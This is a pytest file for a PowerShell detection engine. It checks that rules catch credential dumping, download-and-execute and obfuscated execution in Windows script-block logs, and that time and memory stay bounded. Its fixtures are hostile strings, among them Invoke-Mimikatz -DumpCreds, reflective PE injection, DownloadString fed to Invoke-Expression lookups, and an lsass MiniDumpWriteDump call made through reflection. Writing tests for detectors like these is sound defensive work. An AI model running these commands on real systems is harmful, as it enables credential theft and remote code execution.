"""Synthetic native script cases for bounded production-rule evaluation."""
import gc
import json
import random
import subprocess
import sys
import tempfile
import time
import tracemalloc
from pathlib import Path

if __name__ == '__main__':
    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import pytest

from romulus.detect.powershell_tokens import read_event_script
from romulus.evidence.windows import normalize_windows
from romulus.evidence.windows_catalog import (
    LEGACY_POWERSHELL_CHANNEL,
    LEGACY_POWERSHELL_PROVIDER,
    POWERSHELL_CHANNEL,
    POWERSHELL_PROVIDER,
)
from romulus.evidence.windows_reassembly import ScriptBlockAssembler
from tests.test_windows_script_round3 import ADVERSARIAL, adversarial, native
from tests.test_windows_script_rules import RULES
from tests.windows_fixtures import LogicalWindowsEvent, windows_hit


def module_native(payload, record=1, host='ws01'):
    return normalize_windows(windows_hit(LogicalWindowsEvent(
        POWERSHELL_CHANNEL, POWERSHELL_PROVIDER, 4103, host, record, '2026-01-01T00:00:00Z',
        {'Payload': payload}), 'winlogbeat_8'))


def legacy_native(source, payload='', record=1):
    return normalize_windows(windows_hit(LogicalWindowsEvent(
        LEGACY_POWERSHELL_CHANNEL, LEGACY_POWERSHELL_PROVIDER, 800, 'ws01', record, '2026-01-01T00:00:00Z',
        {'param1': source, 'param2': 'HostApplication=powershell.exe\nEngineVersion=5.1',
         'param3': payload}), 'winlogbeat_8'))


def test_constant_substitution_fanout_debits_shared_output_budget():
    parsed = read_event_script(native("$t='" + 'a'*65000 + "'\nWrite-Output" + ' $t'*500))
    assert sum(len(value) for rows in parsed.arguments.values() for row in rows for value in row) <= 2_097_152
    assert parsed.partial and any('MAX_CONSTANT' in limit for limit in parsed.limits)


def test_addtype_source_is_relexed_once_and_proof_arguments_are_bounded(monkeypatch):
    from romulus.detect import windows_scripts
    original, seen = windows_scripts.lex, []
    def counted(text, **kwargs):
        seen.append(text)
        return original(text, **kwargs)
    monkeypatch.setattr(windows_scripts, 'lex', counted)
    observation = native("$t='" + 'a'*16000 + "'\n" + 'Add-Type -TypeDefinition $t | '*10 + '\nInvoke-Mimikatz')
    RULES['pinvoke']().consume([observation])
    assert len(seen) == 1
    proof = RULES['offensive_function']()._proof(observation, read_event_script(observation))
    assert len(json.dumps(proof)) < 262144
    large = native("$t='" + 'a'*65000 + "'\nOut-File" + ' $t'*40 + '\nInvoke-Mimikatz')
    rule = RULES['offensive_function']()
    proof = rule._proof(large, read_event_script(large))
    assert len(json.dumps(proof)) < 262144
    assert proof['argument_summary']['omitted_values'] > 0


@pytest.mark.parametrize('source', [
    "$b='" + 'TVqQ'*20000 + "'\nInvoke-Mimikatz -DumpCreds",
    "$p=[Convert]::FromBase64String('" + 'TVqQ'*20000 + "')\nInvoke-ReflectivePEInjection -PEBytes $p",
    "$b='" + 'a'*40000 + "'+'" + 'b'*40000 + "'\nInvoke-Mimikatz",
], ids=['assignment', 'base64_argument', 'concatenation_result'])
def test_oversize_literal_or_result_remains_complete_with_high_call(source):
    observation = native(source)
    assert not read_event_script(observation).partial
    [match] = RULES['offensive_function']().consume([observation])
    assert match.proposed_lane == 'high'


@pytest.mark.parametrize('target', [
    "& (Get-Command 'Invoke-Expression')", '& (gcm "I*X")', "& (Get-Command -Name 'I*X')",
    "& (Get-Alias 'iex')", "& (Get-Alias -Name '?e?')",
    "& $ExecutionContext.InvokeCommand.GetCmdlet('Invoke-Expression')",
    "& $ExecutionContext.InvokeCommand.GetCommand('Invoke-Expression','Cmdlet')",
    "& ($ExecutionContext.InvokeCommand.GetCmdlet('Invoke-Expression'))",
    "& ($ExecutionContext.InvokeCommand.GetCommand('Invoke-Expression','Cmdlet'))",
    "& (Get-Command -Name ('I*X'))", "& (Get-Alias ('?e?'))",
    "& (Get-Command -Name ('Invoke-Expression'))",
    '& ($ExecutionContext.InvokeCommand.NewScriptBlock($code))',
    '& ([scriptblock]::Create($code))', '& ([System.Management.Automation.ScriptBlock]::Create($code))',
])
def test_lookup_and_scriptblock_evaluators_are_shared_by_download_and_decode(target):
    for prefix, name in [("(New-Object Net.WebClient).DownloadString('https://example.test/a') | ", 'download'),
                         ('[Convert]::FromBase64String($data) | ', 'decode_evaluation')]:
        observation = native(prefix + target)
        [match] = RULES[name]().consume([observation])
        assert match.proposed_lane == 'lead'


@pytest.mark.parametrize('source', [
    r"& ($env:SystemRoot + '\System32\cscript.exe') //nologo x.vbs", r". ($PSScriptRoot + '\Common.ps1')",
    r". (Join-Path $PSScriptRoot 'Common.ps1')", "& $tools['git'] status", '& $steps[0] -Verbose',
    '& $MyInvocation.MyCommand.Path', 'foreach ($s in $scripts) { & $s.FullName }',
    r"Invoke-WebRequest $url -OutFile $f; & ($env:TEMP + '\setup.exe') /quiet",
    '& (Get-Command *Update-Help*)', '& (Get-Command -Name "*Update-Help*")',
    '& (Get-Command -Name "Update-Help?")',
    "& (Get-Command -Name ('*Update-Help*'))",
    r'& "$PSScriptRoot\x.ps1" @PSBoundParameters',
])
def test_administrative_path_and_lookup_calls_are_not_obfuscated(source):
    assert not RULES['obfuscated_execution']().consume([native(source)])


@pytest.mark.parametrize('lookup', ["$ExecutionContext.InvokeCommand.GetCmdlet('Invoke-Expression')",
                                    "$ExecutionContext.InvokeCommand.GetCommand('Invoke-Expression','Cmdlet')"])
def test_uninvoked_member_lookup_is_not_a_code_evaluator(lookup):
    for prefix, rule in [("(New-Object Net.WebClient).DownloadString('https://example.test/a'); ", 'download'),
                         ('[Convert]::FromBase64String($data); ', 'decode_evaluation')]:
        assert not RULES[rule]().consume([native(prefix+lookup)])


def test_no_block_module_records_fold_per_behavior_and_preserve_first_host():
    payload = 'CommandInvocation(Get-DomainUser): "Get-DomainUser"\nParameterBinding(Get-DomainUser): name="Identity"; value="x"'
    rule = RULES['offensive_function']()
    matches = [m for i in range(50) for m in rule.consume([module_native(payload, i+1)])]
    assert len(matches) == 1
    assert len(rule.consume([module_native(payload, 51, 'ws02')])) == 1


def test_legacy_pipeline_text_is_partial_and_module_bindings_stay_data():
    payload = ('CommandInvocation(Write-Output): "Write-Output"\n'
               'ParameterBinding(Write-Output): name="Object"; value="Invoke-Mimikatz; iex $x"')
    observation = legacy_native('Get-Date', payload)
    assert observation.get('script.text') == 'Get-Date'
    assert observation.get('script.module_payload') == payload
    assert not RULES['offensive_function']().consume([observation])
    parsed = read_event_script(observation)
    assert parsed.partial and parsed.module_binding_data and 'iex' not in parsed.commands
    rule = RULES['offensive_function']()
    matches = [m for i in range(50) for m in rule.consume([legacy_native('Invoke-Mimikatz', payload, i+2)])]
    assert len(matches) == 1 and matches[0].proposed_lane == 'lead'


@pytest.mark.parametrize('source', [
    "[string]$x='Invoke-Mimi'+'katz'\n& $x -DumpCreds",
    "$x='Invoke-Mimi'+'katz'\n$null=" + '('*34 + '1' + ')'*34 + '\n& $x -DumpCreds',
    "$x='Invoke-Mimi'+'katz'\nsv other " + '('*34 + '1' + ')'*34 + '\n& $x -DumpCreds',
    "$x='Invoke-Mimi'+'katz'\n& Set-Variable other " + '('*34 + '1' + ')'*34 + '\n& $x -DumpCreds',
])
def test_typed_assignment_and_unrelated_capped_statement_keep_proven_constant(source):
    assert RULES['offensive_function']().consume([native(source)])


@pytest.mark.parametrize('read', ['$x[0]', "$x + 'suffix'", '$x - 1'])
def test_capped_statement_read_does_not_invalidate_an_unwritten_constant(read):
    source = "$x='Invoke-Mimikatz'\n$null=" + '('*34 + read + ')'*34 + '\n& $x'
    observation = native(source)
    assert 'invoke-mimikatz' in read_event_script(observation).commands
    assert RULES['offensive_function']().consume([observation])


@pytest.mark.parametrize('write', ["$y[0]='x'", "$y+='x'", '$y-=1', '$y++', '$y--',
                                    "sv y 'Get-Date'", "Set-Variable -Name y 'Get-Date'"])
def test_capped_statement_writes_invalidate_the_target_and_keep_unrelated_fact(write):
    source = "$x='Invoke-Mimikatz'; $y='Get-GppPassword'\n$null=" + '('*34 + write + ')'*34
    source += '\nWrite-Output (& $x) (& $y)'
    parsed = read_event_script(native(source))
    assert 'invoke-mimikatz' in parsed.commands
    assert 'get-gpppassword' not in parsed.commands


def test_capped_index_write_does_not_leave_an_alias_with_stale_array_contents():
    source = "$x=[char[]]'Get-GppPassword'; $y=$x\n$null=" + '('*34 + "$y[0]=[char]88" + ')'*34
    observation = native(source + '\n& (-join $x)')
    assert not RULES['offensive_function']().consume([observation])
    assert RULES['obfuscated_execution']().consume([observation])


def test_parenthesized_command_target_does_not_extend_into_argument_operator():
    parsed = read_event_script(native("& ('Invoke-Mimikatz') + 'x'"))
    assert 'invoke-mimikatz' in parsed.commands and 'invoke-mimikatzx' not in parsed.commands


def test_prompt_for_credential_and_plaintext_access_need_no_output_call():
    observation = native("$c=$Host.UI.PromptForCredential('Title','Message','',''); $c.GetNetworkCredential().Password")
    [match] = RULES['credential_harvest']().consume([observation])
    assert match.proposed_lane == 'lead'
    assert not RULES['credential_harvest']().consume([native("$Host.UI.PromptForCredential('Title','Message','','')")])


@pytest.mark.parametrize('legacy', [False, True], ids=['complete4104', 'partial800'])
def test_download_and_folded_item_open_request_is_a_lead(legacy):
    source = ("(New-Object Net.WebClient).DownloadFile('https://example.test/a','C:/Temp/a.exe'); "
              "$open='Invoke-'+'Item'; & $open 'C:/Temp/a.exe'")
    observation = legacy_native(source) if legacy else native(source)
    [match] = RULES['download']().consume([observation])
    assert match.proposed_lane == 'lead'
    assert 'program-start/item-open request' in match.claim
    assert 'data flow and execution are unverified' in match.claim
    assert 'code-evaluation' not in match.claim


@pytest.mark.parametrize('starter', ['Start-Process', 'saps', 'Invoke-Item', 'ii'])
def test_download_with_program_start_or_item_open_has_separate_request_wording(starter):
    observation = native("Invoke-WebRequest https://example.test/a -OutFile C:/Temp/a.exe; "
                         + starter + ' C:/Temp/a.exe')
    [match] = RULES['download']().consume([observation])
    assert match.proposed_lane == 'lead' and 'program-start/item-open request' in match.claim
    assert not RULES['obfuscated_execution']().consume([observation])


@pytest.mark.parametrize('source', [
    'Invoke-WebRequest https://example.test/a -OutFile C:/Temp/a.exe',
    'Start-Process C:/Temp/a.exe', 'Invoke-Item C:/Temp/a.exe',
])
def test_download_start_branch_requires_both_observed_requests(source):
    assert not RULES['download']().consume([native(source)])


def test_decode_plus_program_start_is_not_a_code_evaluator():
    from romulus.detect.windows_scripts import runs_code
    observation = native('[Convert]::FromBase64String($data); Start-Process C:/Temp/a.exe')
    assert not runs_code(read_event_script(observation))
    assert not RULES['decode_evaluation']().consume([observation])


@pytest.mark.parametrize('dump', [
    "$t=[ref].Assembly.GetType('System.Management.Automation.WindowsErrorReporting').GetNestedType('NativeMethods'); $t.GetMethod('MiniDumpWriteDump').Invoke($null,$args)",
    "Add-Type -TypeDefinition '[DllImport(\"Dbghelp.dll\")] public static extern bool MiniDumpWriteDump();'; $type.GetMethod('MiniDumpWriteDump').Invoke($null,$args)",
])
def test_reflection_or_dllimport_dump_requires_actual_lsass_selection(dump):
    [match] = RULES['lsass_access']().consume([native('Get-Process lsass; '+dump)])
    assert match.proposed_lane == 'high'
    assert not RULES['lsass_access']().consume([native('Get-Process notepad; '+dump)])
    assert not RULES['lsass_access']().consume([native("Get-Process lsass; Write-Output 'MiniDumpWriteDump'")])
    assert not RULES['lsass_access']().consume([native(
        "Get-Process lsass; Add-Type -TypeDefinition '[DllImport(\"Dbghelp.dll\")] public static extern bool MiniDumpWriteDump();'")])


def test_printed_dump_api_name_cannot_qualify_an_unrelated_reflection_call():
    observation = native("Get-Process lsass; $type.GetMethod('ToString').Invoke($null,$args); Write-Output 'MiniDumpWriteDump'")
    assert not RULES['lsass_access']().consume([observation])


@pytest.mark.parametrize('lookup', ["$type.GetMethod('MiniDumpWriteDump')",
                                    "$type.GetProcAddress($library,'MiniDumpWriteDump')"])
def test_dump_api_metadata_lookup_alone_does_not_claim_invocation(lookup):
    assert not RULES['lsass_access']().consume([native('Get-Process lsass; '+lookup)])


NEW_ADVERSARIAL = (
    'var_literals', 'var_args', 'var_static_join', 'var_addtype', 'var_outfile',
    'module_quotes_ws', 'module_quotes_tail', 'module_lines', 'module_lines_ws', 'short_fail_exprs',
    'alt_here', 'alt_here_open', 'deep_at_paren', 'deep_at_brace', 'deep_at_lines',
    'backtick_run', 'backtick_run_q', 'fmt_4096', 'word_merge_curly', 'word_merge_mixed',
    'static_backscan', 'expr_end_comment', 'assign_fail_reparse',
)


def build_adversarial(name, size):
    if name in ADVERSARIAL:
        return adversarial(name, size)
    if name.startswith('var_'):
        head = "Invoke-Mimikatz;\n$t='" + 'a'*min(65000, size//4) + "'\n"
        if name in {'var_args', 'var_outfile'}:
            head += 'Write-Output' if name == 'var_args' else 'Out-File'
            piece = ' $t'
        elif name == 'var_static_join':
            piece = '[' + ' $t'*58 + ']::method('
        else:
            piece = '$t;' if name == 'var_literals' else 'Add-Type -TypeDefinition $t | '
        return (head + piece*((size-len(head)+len(piece)-1)//len(piece)))[:size]
    if name == 'short_fail_exprs':
        rnd, pieces, length = random.Random(1), [], 0
        while length < size:
            piece = '"$(' + "''+"*rnd.randint(1, 40) + rnd.choice(['$u', '(', '[x]', '-f', '@(', "'a'-f$u"]) + ')"\n'
            pieces.append(piece)
            length += len(piece)
        return ''.join(pieces)[:size]
    pieces = {
        'module_quotes_ws': 'ParameterBinding(Out-Default): name="InputObject"; value="' + ('"'+' '*7)*(size//8)+'x',
        'module_quotes_tail': 'ParameterBinding(Out-Default): name="InputObject"; value="' + '" '*(size//2),
        'module_lines': 'ParameterBinding(a): name="b"; value="c d e"\n',
        'module_lines_ws': 'ParameterBinding(a): name="b"; value="'+'" '*8+'\n',
        'alt_here': '@"\n$(x)\n"@\n@\'\nab\n\'@\n', 'alt_here_open': '@"\nA"@ "@\n@\'\n',
        'deep_at_paren': '@(', 'deep_at_brace': '@{', 'deep_at_lines': '@('*40+'\n',
        'backtick_run': '`', 'backtick_run_q': '"'+'`'*(size-2)+'"',
        'fmt_4096': "'{0}' -f " + ','.join(["'a'"]*4096)+'\n',
        'word_merge_curly': 'x‘b’c', 'word_merge_mixed': 'x\'b\'"c"d`e',
        'static_backscan': ']::b(', 'expr_end_comment': '"$(<#'+'('*20+'#>)"',
        'assign_fail_reparse': '$a = '+"''+"*300+'$u\n',
    }
    piece = pieces[name]
    return (piece*((size+len(piece)-1)//len(piece)))[:size]


def production_probe(name, size, memory=False):
    gc.collect()
    if memory:
        tracemalloc.start()
    text = build_adversarial(name, size)
    if name.startswith('module_'):
        observation = module_native(text)
    else:
        with tempfile.TemporaryDirectory() as directory:
            assembler = ScriptBlockAssembler(Path(directory))
            try:
                midpoint = len(text)//2
                views = assembler.consume([native(text[:midpoint], total=2),
                                           native(text[midpoint:], number=2, total=2, record=2)])
                [observation] = [view for view in views if view.get('script.view') == 'joined']
                assert observation.get('script.text') == text
            finally:
                assembler.close()
    rule_times, matches = {}, []
    for name_, cls in sorted(RULES.items()):
        rule = cls()
        started = time.perf_counter()
        matches.extend(rule.consume([observation]))
        rule_times[name_] = time.perf_counter()-started
        rule.release_state()
        rule.close_spill()
    parsed = read_event_script(observation)
    peak = tracemalloc.get_traced_memory()[1] if memory else 0
    if memory:
        tracemalloc.stop()
    assert not parsed.partial or parsed.limits
    return {'seconds': sum(rule_times.values()), 'rules': rule_times, 'peak': peak,
            'partial': parsed.partial, 'limits': sorted(parsed.limits), 'matches': len(matches)}


@pytest.mark.parametrize('name', (*ADVERSARIAL, *NEW_ADVERSARIAL))
def test_every_native_script_rule_is_time_and_memory_bounded(name):
    child = subprocess.run([sys.executable, str(Path(__file__).resolve()), '--production-probe', name],
                           check=False, capture_output=True, text=True, timeout=120)
    assert child.returncode == 0, child.stdout+child.stderr
    results = json.loads(child.stdout)
    assert len(results[0]['rules']) == len(RULES)
    assert results[1]['seconds'] < 8
    assert results[1]['seconds'] <= 20*max(results[0]['seconds'], .02)
    assert results[2]['peak'] <= 256*1024*1024
    print(name, json.dumps(results))


if __name__ == '__main__' and '--production-probe' in sys.argv:
    print(json.dumps([production_probe(sys.argv[-1], 65536), production_probe(sys.argv[-1], 1048576),
                      production_probe(sys.argv[-1], 1048576, memory=True)]))
